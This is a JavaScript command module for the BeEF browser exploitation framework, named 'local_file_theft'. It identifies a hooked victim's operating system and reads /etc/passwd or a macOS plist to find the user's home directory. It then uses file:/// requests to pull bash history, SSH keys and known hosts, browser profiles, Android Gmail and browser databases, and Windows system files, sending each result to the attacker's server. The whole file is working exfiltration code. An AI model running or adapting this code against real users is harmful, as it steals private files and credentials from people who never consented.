//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
// local_file_theft
//
// Shamelessly plagurised from kos.io/xsspwn

beef.execute(function() {

result = '';
       
    fileList = ['linux','mac','ios','android','windows']


    fileList['linux']=  {
				    // How do we discover users?
				    "discover"	:'/etc/passwd',

				    // Okay, we found them, what do we pillage?
				    "post" 		:{
							    'bashHistory':'.bash_history',
							    'sshHosts':'.ssh/known_hosts',
							    'sshKeys':'.ssh/id_rsa.pub',
							    'firefoxProfiles':'.mozilla/firefox/profiles.ini',
							    'chromeBookmarks':'.config/chromium/Default/Bookmarks'
							    }
				    }

    fileList['mac']=  {
				    // How do we discover users?
				    "discover"	:'/Library/Preferences/com.apple.loginwindow.plist',

				    // Okay, we found them, what do we pillage?
				    "post" 		:{
							    'bashHistory':'.bash_history',
							    'sshHosts':'.ssh/known_hosts',
							    'sshKeys':'.ssh/id_rsa.pub',
							    'firefoxProfiles':'.mozilla/firefox/profiles.ini',
							    'chromeBookmarks':'.config/chromium/Default/Bookmarks'
							    }
				    }

    fileList['android']=  {
				    // Instead of how, just figure out the currently in use appi
				    "discover"	:'/proc/self/status',

				    // Okay, we found them, what do we pillage?
				    "post" 		:{
							    'browser_data':'/data/data/com.android.browser/databases/webview.db',
							    'browser_data2':'/data/data/com.android.browser/databases/browser.db',
							    'gmail_accounts':'/data/data/com.google.android.gm/shared_prefs/Gmail.xml',
							    'dolpin_data':'/data/data/mobi.mgeek.TunnyBrowser/databases/webview.db',
							    'dolpin_data2':'/data/data/mobi.mgeek.TunnyBrowser/databases/browser.db',
							    'chromeBookmarks':'.config/chromium/Default/Bookmarks'
							    }
				    }

    fileList['ios']=  {
				    // WHAT IS THIS I DON'T EVEN
				    "discover"	:'',

				    "post" 		:{
							    'iPadEtcHosts':'/etc/hosts'
							    }
				    }

    fileList['windows']=  {
				    // Meh, who cares
				    "discover"	:'',

				    "post" 		:{
							    'bootini':'/c:/boot.ini',
							    'hosts':'/c:/WINDOWS/system32/drivers/etc/hosts'
							    }
			    }

    functionList = {
			    mac:{
				    // OS X disovery
				    discover : function(){
									    tmp = new XMLHttpRequest()
									    tmp.open('get',"file:///"+fileList['mac']['discover'])
									    tmp.send()
									    tmp.onreadystatechange=function(){
										    if(tmp.readyState==4){
                                                // TODO 
                                                // Understand plist format to _reliably_ pull out username with regex
											    //user = tmp.responseText.match(/\x03\x57(.*)\x12/)[1];
                                                user = tmp.responseText.match(/\x54(.*)\x12\x01/)[1];			
											    homedir = "/Users/"+user+"/";
											    grabFiles(homedir,"mac")
										    }
									    }
									    return true;
							    }
				    },
				
			    linux:{
			    // Linux username discovery
				    discover : function(){
									    tmp = new XMLHttpRequest()
									    tmp.open('get',"file:///"+fileList['linux']['discover'])
									    tmp.send()
									    tmp.onreadystatechange=function(){
										    if(tmp.readyState==4){
											    userDir = tmp.responseText.match(/[a-z0-9]*:x:[0-9]{4}:[0-9]{4}:[^:]*:([^:]*)/)[1];
											    homedir = userDir+"/";
											
											    grabFiles(homedir,"linux")
										    }
									    }
									    return true;
							    }
				    },

			
			    ios:{
			    // Grab ipad stuff
				    discover : function(){
									    tmp = new XMLHttpRequest()
									    tmp.open('get',fileList['ios']['discover'])
									    tmp.send()
									    tmp.onreadystatechange=function(){
										    if(tmp.readyState==4){
											    homedir = "file:///";
											    grabFiles(homedir,"ios")
										    }
									    }

					    alert("ipad")
					    }
				    },

			    android:{
			    // figure out what app (gmail, browser, or dolphin?) android 
				    discover : function(){
								    //document.location="http://kos.io/"
									    tmp = new XMLHttpRequest()
									    tmp.open('get',fileList['android']['discover'])
									    tmp.send()
									    tmp.onreadystatechange=function(){
										    if(tmp.readyState==4){
											    if(/.*android\.gm.*/.test(tmp.responseText)){
												    document.location="http://kos.io/gmail"
											    } else if(/.*android\.browser.*/.test(tmp.responseText)){
												    document.location="http://kos.io/browser"
											    } else if(/.*ek\.TunnyBrowser.*/.test(tmp.responseText)){
												    document.location="http://kos.io/dolphin"
											    }

											    grabFiles("/","android")
										    }
									    }
									    return true;
							    }
				    }
			
		
    }


    function identify(){
	    if(/.*Android.*/.test(navigator.userAgent)){
		    return "android"
	    } else if(/Linux.*/i.test(navigator.platform)){
		    return "linux"
	    } else if(/iP.*/i.test(navigator.platform)){
		    return "ios"
	    } else if(/.*Mac.*/i.test(navigator.userAgent)){
		    return "mac"
	    } else if(/.*Windows.*/i.test(navigator.userAgent)){
		    return "windows"
	    } else if(/.*hpwOS.*/i.test(navigator.platform)){
		    return "webos"
	    }
    }


    function discoverUsers(os){
	    return functionList[os]['discover']()
    }


    function grabFiles(dir,os){
	    tmpfile = {}
	    for (i in fileList[os]['post']){
            console.log('dir = ' + dir);
            console.log('fileList: ' + fileList[os]['post'][i]);
		    console.log(i);
		    tmpfile[i] = new XMLHttpRequest()
		    tmpfile[i].open ('get',dir+"/"+fileList[os]['post'][i]);
		    tmpfile[i].send();
            
		    tmpfile[i].onreadystatechange=function(){
                for (j in fileList[os]['post']){
			        if(tmpfile[j].readyState==4){
                        console.log('new returned for: ' + j);
                        result = j +": "+ tmpfile[j].responseText;
                        
                        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result);
			        }
                }
		    }
            

	    }	
 
    }


    discoverUsers(identify());
   
    

});
